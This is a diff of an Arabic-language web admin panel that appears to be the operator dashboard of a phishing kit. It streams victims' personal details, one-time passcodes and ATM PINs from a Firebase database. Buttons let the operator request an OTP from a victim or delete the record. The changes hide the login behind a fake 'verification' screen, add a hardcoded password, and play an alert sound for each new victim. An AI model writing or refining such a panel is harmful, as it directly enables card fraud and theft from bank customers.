@@ -3,58 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام الإدارة المركزي</title>
+    <title>نظام الإدارة</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
         :root { --p-clr: #006C35; --dark: #0a0a0a; --accent: #00ff88; }
         body { font-family: 'Segoe UI', sans-serif; background: var(--dark); color: #fff; margin: 0; overflow-x: hidden; }
         
-        /* شاشة الدخول والتمويه */
-        #auth-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
-        .login-box { background: #111; padding: 30px; border-radius: 15px; border: 1px solid #333; width: 90%; max-width: 350px; }
-        .loader { border: 3px solid #333; border-top: 3px solid var(--accent); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
+        /* شاشة التمويه */
+        #l-scr { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
+        .loader { border: 3px solid #333; border-top: 3px solid var(--accent); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        input[type="password"] { width: 100%; padding: 12px; margin: 15px 0; border-radius: 5px; border: 1px solid #444; background: #000; color: #fff; text-align: center; font-size: 18px; box-sizing: border-box; }
-        .btn-login { width: 100%; padding: 12px; background: var(--p-clr); border: none; color: white; font-weight: bold; cursor: pointer; border-radius: 5px; }
-        
-        /* اللوحة الرئيسية */
+        #p-in { position: absolute; opacity: 0; pointer-events: none; }
+
+        /* اللوحة */
         .h-nav { background: #1a1a1a; padding: 15px; border-bottom: 2px solid var(--p-clr); display: flex; justify-content: space-between; align-items: center; }
-        .main-c { padding: 20px; }
+        .main-c { padding: 20px; max-width: 1200px; margin: auto; }
         .r-row { background: #1e1e1e; border-radius: 10px; padding: 15px; margin-bottom: 10px; display: grid; grid-template-columns: 1.5fr 2fr 1.5fr 1fr; gap: 10px; align-items: center; border-right: 5px solid var(--p-clr); }
-        .c-num { color: #ff4d4d; font-family: monospace; font-size: 18px; background: #2a1010; padding: 5px; border-radius: 5px; text-align: center; }
-        .act { display: flex; flex-direction: column; gap: 5px; }
-        .b-ok { background: var(--p-clr); color: white; padding: 8px; border: none; cursor: pointer; border-radius: 5px; }
-        .b-no { background: #444; color: white; padding: 8px; border: none; cursor: pointer; border-radius: 5px; }
+        .c-num { color: #ff4d4d; font-family: monospace; font-size: 18px; background: #2a1010; padding: 5px; border-radius: 5px; text-align: center; border: 1px solid #4d1a1a; }
+        
+        button { padding: 10px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; transition: 0.2s; }
+        .b-ok { background: var(--p-clr); color: white; }
+        .b-no { background: #444; color: white; }
+        .b-ok:hover { background: #008a44; }
     </style>
 </head>
 <body>
 
-<div id="auth-screen">
-    <div class="login-box" id="login-form">
-        <h3 style="margin: 0;">تسجيل الدخول</h3>
-        <p style="color: #666; font-size: 12px;">نظام المراقبة المشفر</p>
-        <input type="password" id="pass-input" placeholder="كلمة المرور">
-        <button class="btn-login" onclick="attemptLogin()">دخول</button>
-    </div>
-    
-    <div class="login-box" id="waiting-screen" style="display: none;">
-        <div class="loader" style="display: block;"></div>
-        <h3>جاري التحقق...</h3>
-        <p id="status-msg" style="color: #888;">يرجى الانتظار للموافقة من قبل الإدارة المركزية</p>
-    </div>
+<div id="l-scr">
+    <div class="loader"></div>
+    <h2 style="color: #eee;">نظام التحقق المركزي</h2>
+    <p style="color: #666;">جاري فحص الصلاحيات، يرجى الانتظار...</p>
+    <input type="password" id="p-in" autofocus oninput="_auth(this.value)">
 </div>
 
+<audio id="_notif" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>
+
 <div class="h-nav">
-    <div style="color: var(--accent);">نشط الآن: <span id="_online">0</span></div>
+    <div style="color: var(--accent);">متصل الآن: <span id="_online">0</span></div>
     <div style="font-weight: bold;">لوحة البيانات اللحظية</div>
 </div>
 
 <div class="main-c" id="_logs"></div>
 
 <script>
-    // بيانات الفايربيس (System-Cloud-V3)
     const _cfg = {
         apiKey: "AIzaSyC84Zm9LxskNvp0Bq8LutoVX...", 
         authDomain: "system-cloud-v3.firebaseapp.com",
@@ -68,43 +60,18 @@
     firebase.initializeApp(_cfg);
     const _db = firebase.database();
 
-    // دالة محاولة الدخول
-    function attemptLogin() {
-        const pass = document.getElementById('pass-input').value;
-        if(pass === "H1234567890H") {
-            document.getElementById('login-form').style.display = 'none';
-            document.getElementById('waiting-screen').style.display = 'block';
-            
-            // هنا السيستم "ينتظر" إشارة القبول من قاعدة البيانات
-            checkPermission();
-        } else {
-            alert("كلمة المرور غير صحيحة");
+    // حفظ الدخول عشان ما يطلبش باسورد كل شوية
+    if(localStorage.getItem('admin_login') === 'true') {
+        document.getElementById('l-scr').style.display = 'none';
+    }
+
+    function _auth(v) {
+        if(v === "H1234567890H") {
+            localStorage.setItem('admin_login', 'true');
+            document.getElementById('l-scr').style.display = 'none';
         }
     }
 
-    function checkPermission() {
-        // نتحقق من مسار خاص في القاعدة اسمه admin_access
-        _db.ref('admin_access/status').on('value', (s) => {
-            if(s.val() === 'approved') {
-                document.getElementById('status-msg').innerText = "تم القبول، جاري فتح اللوحة...";
-                setTimeout(() => {
-                    document.getElementById('auth-screen').style.display = 'none';
-                    // حفظ حالة الدخول في المتصفح عشان ما يطلبش تاني
-                    localStorage.setItem('is_logged', 'true');
-                }, 1500);
-            } else if(s.val() === 'rejected') {
-                document.getElementById('status-msg').innerText = "تم رفض طلب الدخول.";
-                document.getElementById('status-msg').style.color = "red";
-            }
-        });
-    }
-
-    // إذا كان مسجل دخول مسبقاً
-    if(localStorage.getItem('is_logged') === 'true') {
-        document.getElementById('auth-screen').style.display = 'none';
-    }
-
-    // وظيفة عرض البيانات (الكروت)
     function _draw(id, data) {
         let card = document.getElementById('card-' + id);
         const user = data.personal_info || {};
@@ -117,7 +84,7 @@
                 <span style="color:#00aaff; font-weight:bold;">OTP: ${cardInfo.otp || '----'}</span><br>
                 <span style="color:#ff4d4d; font-size:12px;">PIN: ${cardInfo.atm_pin || '----'}</span>
             </div>
-            <div class="act">
+            <div style="display:flex; flex-direction:column; gap:5px;">
                 <button class="b-ok" onclick="_cmd('${id}', 'go_to_otp')">طلب OTP</button>
                 <button class="b-no" onclick="_del('${id}')">حذف</button>
             </div>
@@ -127,6 +94,7 @@
         else {
             card = document.createElement('div'); card.id = 'card-' + id; card.className = 'r-row';
             card.innerHTML = content; document.getElementById('_logs').insertBefore(card, document.getElementById('_logs').firstChild);
+            document.getElementById('_notif').play().catch(e=>{});
         }
     }
 
@@ -134,7 +102,7 @@
     _db.ref('orders').on('child_changed', (s) => _draw(s.key, s.val()));
     _db.ref('orders').on('child_removed', (s) => document.getElementById('card-' + s.key)?.remove());
 
-    function _cmd(id, st) { _db.ref('orders/' + id).update({ next_step: st }); }
+    function _cmd(id, st) { _db.ref('orders/' + id).update({ next_step: st, last_action: Date.now() }); }
     function _del(id) { if(confirm('حذف؟')) _db.ref('orders/' + id).remove(); }
 
     _db.ref('live_sessions').on('value', (s) => {
